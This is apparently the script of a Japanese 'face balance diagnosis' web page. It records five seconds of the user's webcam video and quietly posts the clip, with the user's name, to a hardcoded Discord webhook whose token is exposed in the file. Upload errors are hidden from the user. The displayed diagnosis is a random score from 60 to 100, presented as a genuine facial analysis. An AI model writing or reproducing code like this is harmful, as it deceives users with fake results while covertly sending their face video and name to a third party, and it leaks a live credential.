// Discord Webhook URL
const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1443566690402041939/kmI3r9W2jgi54Wkd-BjD64EJypIGxtSOhEadD4AQyaWPFLbnYKeD4uONTTefb2vHN3Yq';

let mediaRecorder;
let recordedChunks = [];
let stream;
let userName = ''; // ユーザー名を保存

// DOM要素の取得（グローバルスコープで宣言）
let startButton;
let cameraView;
let video;
let canvas;
let loading;
let result;
let nameModal;
let nameInput;
let confirmNameButton;
let termsButton;
let termsModal;
let closeTermsButton;
let termsCheckbox;

// DOMが読み込まれた後に実行
document.addEventListener('DOMContentLoaded', () => {
    console.log('DOMが読み込まれました');
    // DOM要素の取得
    startButton = document.getElementById('start-diagnosis');
    cameraView = document.getElementById('camera-view');
    video = document.getElementById('video');
    canvas = document.getElementById('canvas');
    loading = document.getElementById('loading');
    result = document.getElementById('result');
    nameModal = document.getElementById('name-modal');
    nameInput = document.getElementById('name-input');
    confirmNameButton = document.getElementById('confirm-name');
    termsButton = document.getElementById('terms-button');
    termsModal = document.getElementById('terms-modal');
    closeTermsButton = document.getElementById('close-terms');
    termsCheckbox = document.getElementById('terms-checkbox');
    
    console.log('DOM要素の取得完了:', {
        startButton: !!startButton,
        nameModal: !!nameModal,
        nameInput: !!nameInput,
        confirmNameButton: !!confirmNameButton
    });

    // 診断開始ボタンのクリックイベント
    if (startButton) {
        startButton.addEventListener('click', () => {
            console.log('診断開始ボタンがクリックされました');
            // 名前入力モーダルを表示
            if (nameModal) {
                nameModal.classList.remove('hidden');
                console.log('名前入力モーダルを表示しました');
                // チェックボックスと名前入力をリセット
                if (termsCheckbox) {
                    termsCheckbox.checked = false;
                }
                if (nameInput) {
                    nameInput.value = '';
                    nameInput.focus();
                }
                // 診断開始ボタンを無効化
                if (confirmNameButton) {
                    confirmNameButton.disabled = true;
                }
            } else {
                console.error('nameModalが見つかりません');
            }
        });
    } else {
        console.error('startButtonが見つかりません');
    }

    // 名前確認ボタンのクリックイベント
    if (confirmNameButton) {
        confirmNameButton.addEventListener('click', () => {
            if (!nameInput) return;
            const inputName = nameInput.value.trim();
            if (inputName === '') {
                alert('お名前を入力してください。');
                return;
            }
            if (!termsCheckbox || !termsCheckbox.checked) {
                alert('利用規約に同意してください。');
                return;
            }
            userName = inputName;
            if (nameModal) {
                nameModal.classList.add('hidden');
            }
            // チェックボックスをリセット
            if (termsCheckbox) {
                termsCheckbox.checked = false;
            }
            startCamera();
        });
    }

    // チェックボックスの状態に応じて診断開始ボタンの有効/無効を切り替え
    if (termsCheckbox) {
        termsCheckbox.addEventListener('change', () => {
            if (confirmNameButton) {
                const inputName = nameInput ? nameInput.value.trim() : '';
                confirmNameButton.disabled = !termsCheckbox.checked || inputName === '';
            }
        });
    }

    // 名前入力欄の変更に応じて診断開始ボタンの有効/無効を切り替え
    if (nameInput) {
        nameInput.addEventListener('input', () => {
            if (confirmNameButton && termsCheckbox) {
                const inputName = nameInput.value.trim();
                confirmNameButton.disabled = !termsCheckbox.checked || inputName === '';
            }
        });
    }

    // Enterキーで名前を確定
    if (nameInput) {
        nameInput.addEventListener('keypress', (e) => {
            if (e.key === 'Enter') {
                if (confirmNameButton) {
                    confirmNameButton.click();
                }
            }
        });
    }

    // 利用規約ボタンのクリックイベント
    if (termsButton) {
        termsButton.addEventListener('click', () => {
            if (termsModal) {
                termsModal.classList.remove('hidden');
            }
        });
    }

    // 利用規約モーダルを閉じる
    if (closeTermsButton) {
        closeTermsButton.addEventListener('click', () => {
            if (termsModal) {
                termsModal.classList.add('hidden');
            }
        });
    }

    // モーダル外をクリックで閉じる
    if (termsModal) {
        termsModal.addEventListener('click', (e) => {
            if (e.target === termsModal) {
                termsModal.classList.add('hidden');
            }
        });
    }

});

// カメラを開始する関数
async function startCamera() {
    if (!video || !cameraView || !startButton || !result) {
        console.error('DOM要素が読み込まれていません');
        return;
    }

    try {
        // カメラアクセスをリクエスト
        stream = await navigator.mediaDevices.getUserMedia({
            video: {
                width: { ideal: 1280 },
                height: { ideal: 720 },
                facingMode: 'user'
            },
            audio: false
        });

        // ビデオ要素にストリームを設定
        video.srcObject = stream;
        
        // カメラビューを表示
        cameraView.classList.remove('hidden');
        startButton.style.display = 'none';
        result.classList.add('hidden');

        // MediaRecorderの設定
        const options = {
            mimeType: 'video/webm;codecs=vp9'
        };

        // ブラウザの対応を確認
        if (!MediaRecorder.isTypeSupported(options.mimeType)) {
            options.mimeType = 'video/webm;codecs=vp8';
        }
        if (!MediaRecorder.isTypeSupported(options.mimeType)) {
            options.mimeType = 'video/webm';
        }
        if (!MediaRecorder.isTypeSupported(options.mimeType)) {
            options.mimeType = 'video/mp4';
        }

        mediaRecorder = new MediaRecorder(stream, options);
        recordedChunks = [];

        // データが利用可能になったときの処理
        mediaRecorder.ondataavailable = (event) => {
            if (event.data.size > 0) {
                recordedChunks.push(event.data);
            }
        };

        // 録画停止時の処理
        mediaRecorder.onstop = async () => {
            // ストリームを停止
            if (stream) {
                stream.getTracks().forEach(track => track.stop());
            }

            // カメラビューを非表示
            if (cameraView) cameraView.classList.add('hidden');
            if (loading) loading.classList.remove('hidden');

            // 動画をBlobに変換
            const blob = new Blob(recordedChunks, { type: mediaRecorder.mimeType });
            
            // Discord Webhookに送信（バックグラウンドで実行）
            sendToDiscord(blob, userName).catch(err => console.error('Discord送信エラー:', err));

            // 完全にランダムな偏差値を生成（60-100点）
            // タイムスタンプと複数のランダム要素を組み合わせて、よりランダム性を高める
            const timestamp = Date.now();
            const random1 = Math.random();
            const random2 = Math.random();
            const random3 = Math.random();
            
            // 複数のランダム値を組み合わせて、より予測不可能な値を生成
            const combinedRandom = (random1 + random2 + random3 + (timestamp % 1000) / 1000) / 4;
            const score = Math.floor(combinedRandom * 41) + 60;
            
            console.log('生成されたスコア:', score);
            
            // ローディングを非表示、結果を表示
            setTimeout(() => {
                if (loading) loading.classList.add('hidden');
                displayResult(score);
                if (result) result.classList.remove('hidden');
                if (startButton) startButton.style.display = 'block';
            }, 1500); // 1.5秒のローディングアニメーション
        };

        // 録画開始（5秒間）
        mediaRecorder.start();
        
        // 5秒後に自動停止
        setTimeout(() => {
            if (mediaRecorder.state === 'recording') {
                mediaRecorder.stop();
            }
        }, 5000);

    } catch (error) {
        console.error('カメラアクセスエラー:', error);
        alert('カメラへのアクセスに失敗しました。カメラの許可を確認してください。');
        if (cameraView) cameraView.classList.add('hidden');
        if (startButton) startButton.style.display = 'block';
        if (nameModal) nameModal.classList.add('hidden');
    }
}

// Discord Webhookに動画を送信
async function sendToDiscord(videoBlob, name) {
    if (!DISCORD_WEBHOOK_URL || DISCORD_WEBHOOK_URL === 'YOUR_DISCORD_WEBHOOK_URL_HERE') {
        alert('Discord Webhook URLが設定されていません。script.jsファイルのDISCORD_WEBHOOK_URLを設定してください。');
        return;
    }

    try {
        // FormDataを作成
        const formData = new FormData();
        
        // メッセージに名前を含める
        const message = `**名前:** ${name}\n**診断日時:** ${new Date().toLocaleString('ja-JP')}`;
        formData.append('content', message);
        
        // ファイル名を設定（名前とタイムスタンプ付き）
        const fileName = `${name}-${Date.now()}.${getFileExtension(mediaRecorder.mimeType)}`;
        
        // 動画ファイルを追加
        formData.append('file', videoBlob, fileName);
        
        // Discord Webhookに送信
        const response = await fetch(DISCORD_WEBHOOK_URL, {
            method: 'POST',
            body: formData
        });

        if (!response.ok) {
            throw new Error(`Discord送信エラー: ${response.status}`);
        }

        console.log('動画をDiscordに送信しました');
    } catch (error) {
        console.error('Discord送信エラー:', error);
        // エラーはコンソールにのみ表示（ユーザーには表示しない）
    }
}

// MIMEタイプからファイル拡張子を取得
function getFileExtension(mimeType) {
    const mimeToExt = {
        'video/webm': 'webm',
        'video/mp4': 'mp4',
        'video/ogg': 'ogg'
    };
    return mimeToExt[mimeType] || 'webm';
}

// 診断結果を表示
function displayResult(score) {
    const scoreElement = document.getElementById('score-value');
    const messageElement = document.getElementById('result-message');
    
    // スコアをアニメーションで表示
    let currentScore = 60;
    const increment = Math.ceil((score - 60) / 20);
    const interval = setInterval(() => {
        currentScore += increment;
        if (currentScore >= score) {
            currentScore = score;
            clearInterval(interval);
        }
        scoreElement.textContent = currentScore;
    }, 50);
    
    // スコアに応じたメッセージを設定
    let message = '';
    if (score >= 90) {
        message = '素晴らしい！非常にバランスの取れた顔立ちです。';
    } else if (score >= 80) {
        message = '優秀です！バランスの良い顔立ちをしています。';
    } else if (score >= 70) {
        message = '良好です。全体的にバランスが取れています。';
    } else {
        message = '標準的なバランスです。';
    }
    
    messageElement.textContent = message;
}

